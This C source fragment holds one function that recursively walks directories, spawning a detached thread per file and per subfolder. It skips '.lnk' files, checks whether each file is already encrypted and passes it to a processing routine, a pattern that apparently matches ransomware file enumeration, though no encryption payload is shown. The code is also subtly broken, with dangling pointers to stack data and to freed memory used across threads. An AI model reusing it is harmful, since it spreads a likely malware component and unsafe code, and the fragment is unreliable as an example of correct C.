void* directory_worker(void* arg) {
    char* dirpath = (char*)arg;
    DIR *dir;
    struct dirent *entry;

    if ((dir = opendir(dirpath)) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
            char* filepath = malloc(strlen(dirpath) + strlen(entry->d_name) + 2);
            sprintf(filepath, "%s/%s", dirpath, entry->d_name);

            if (entry->d_type == DT_REG && !ends_with(filepath, ".lnk")) {
                int fd = open(filepath, O_RDONLY);
                FileData file_data = {filepath, fd, is_encrypted_file(fd)};
                pthread_t thread_id;
                pthread_create(&thread_id, NULL, process_file, &file_data);
                pthread_detach(thread_id);
            } else if (entry->d_type == DT_DIR) {
                // Recursively process subdirectories
                pthread_t thread_id;
                pthread_create(&thread_id, NULL, directory_worker, filepath);
                pthread_detach(thread_id);
            }

            free(filepath);
        }
        closedir(dir);
    }

    return NULL;
}

